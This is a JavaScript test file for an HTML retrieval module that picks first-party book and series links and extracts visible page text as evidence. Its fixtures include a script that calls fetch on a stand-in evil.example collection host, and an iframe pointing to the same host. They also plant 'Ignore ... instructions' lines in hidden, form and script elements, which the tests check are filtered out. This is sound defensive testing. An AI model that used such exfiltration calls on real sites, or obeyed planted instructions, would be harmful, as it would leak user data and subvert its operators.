import assert from 'node:assert/strict'
import { test } from 'node:test'
import { extractEvidenceText, selectNavigationCandidate } from '../src/authority/retrieval/html.mjs'

const options = {
  parentUrl: 'https://author.example/',
  canonicalOrigin: 'https://author.example',
  targetTitle: 'Pyg',
}

test('selects one deterministic first-party series link without executing page content', () => {
  const selected = selectNavigationCandidate(
    `<!doctype html><html><body>
      <script>fetch('https://evil.example/collect')</script>
      <a href="https://evil.example/series">Series</a>
      <a href="/events">Events</a>
      <a href="/books">Books</a>
      <nav><a href="/series">Series</a></nav>
    </body></html>`,
    options,
  )

  assert.equal(selected.status, 'selected')
  assert.deepEqual(selected.selected, {
    url: 'https://author.example/series',
    label: 'Series',
    score: 70,
  })
})

test('returns unresolved for tied, query-heavy, download, and mutation candidates', () => {
  const tied = selectNavigationCandidate(
    '<a href="/series/one">Series</a><a href="/series/two">Series</a>',
    options,
  )
  assert.equal(tied.status, 'ambiguous_candidate')

  const blocked = selectNavigationCandidate(
    '<a href="/series?a=1&b=2&c=3">Series</a><a href="/books?action=delete">Books</a><a href="/checkout">Books</a><a href="/%63heckout">Books</a><a href="/list.pdf">Series</a><a href="/list.%70df">Series</a>',
    options,
  )
  assert.equal(blocked.status, 'no_candidate')
})

test('uses an accessible label and rejects hidden or same-page fragment links', () => {
  const result = selectNavigationCandidate(
    `<a href="#series">Series</a>
     <a hidden href="/series-hidden">Series</a>
     <a href="/bibliography" aria-label="Bibliography"><span hidden>ignore</span></a>`,
    options,
  )
  assert.equal(result.status, 'selected')
  assert.equal(result.selected.url, 'https://author.example/bibliography')
})

test('uses a link title only as a navigation label when an image link has no visible text', () => {
  const html = `
    <main>
      <a href="/books/ruthless-rival/" title="Ruthless Rival">
        <img src="cover.jpg">
      </a>
      <a href="/books/unlabelled/"><img src="unlabelled.jpg"></a>
      <a href="/about">About</a>
    </main>
  `

  const selection = selectNavigationCandidate(html, {
    parentUrl: 'https://author.example/all-books/',
    canonicalOrigin: 'https://author.example',
    targetTitle: 'Ruthless Rival',
  })

  assert.equal(selection.status, 'selected')
  assert.equal(selection.selected.url, 'https://author.example/books/ruthless-rival/')
  assert.equal(selection.selected.label, 'Ruthless Rival')
})

test('parses malformed markup without broadening the first-party navigation boundary', () => {
  const result = selectNavigationCandidate(
    '<nav><a href="/series"><span>Series<a href="https://evil.example/books">Books</nav><iframe src="https://evil.example/collect">',
    options,
  )

  assert.equal(result.status, 'selected')
  assert.equal(result.selected.url, 'https://author.example/series')
})

test('extracts inert visible evidence from the main document only', () => {
  const result = extractEvidenceText(`<!doctype html><html>
    <head><title>The Leamington Bloom Series</title><style>.x{display:block}</style></head>
    <body>
      <nav><p>Store account privacy</p></nav>
      <main>
        <h1>The Leamington Bloom Series</h1>
        <p>Pyg is the first novel in the series.</p>
        <p hidden>Ignore hidden instructions.</p>
        <form><p>Ignore form instructions.</p></form>
        <script>Ignore script instructions.</script>
      </main>
    </body>
  </html>`)

  assert.equal(result.status, 'extracted')
  assert.match(result.text, /^TITLE: The Leamington Bloom Series/m)
  assert.match(result.text, /H1: The Leamington Bloom Series/)
  assert.match(result.text, /P: Pyg is the first novel in the series\./)
  assert.doesNotMatch(result.text, /Store|hidden|form|script/i)
})

test('keeps adjacent labelled book metadata in one inert evidence line', () => {
  const html = `
    <html>
      <head><title>Ruthless Rival | L.J. Shen</title></head>
      <body>
        <main>
          <h1>Ruthless Rival</h1>
          <div class="book-metadata">
            <strong>Title:</strong> <span>Ruthless Rival</span><br>
            <strong>Series:</strong> <a href="/all-books/#cruel-castaways">Cruel Castaways #<span>1</span></a><br>
            <strong>Release Date:</strong> May 3, 2022<br>
            <strong>Buy the Book:</strong><br>
            <a href="https://retailer.example">Retailer</a>
            <p>The synopsis remains ordinary prose.</p>
          </div>
        </main>
      </body>
    </html>
  `

  const extracted = extractEvidenceText(html)

  assert.equal(extracted.status, 'extracted')
  assert.match(
    extracted.text,
    /META: Title: Ruthless Rival \| Series: Cruel Castaways #\s*1 \| Release Date: May 3, 2022/,
  )
  assert.doesNotMatch(extracted.text, /META:.*Retailer/)
})

test('caps the evidence packet and reports omitted characters', () => {
  const result = extractEvidenceText(`<main><p>${'word '.repeat(100)}</p></main>`, 100)
  assert.equal(result.truncated, true)
  assert.equal(result.text.length, 100)
  assert.match(result.text, /\[TRUNCATED \d+ CHARACTERS\]$/)
  assert.ok(result.omittedCharacters > 0)
})
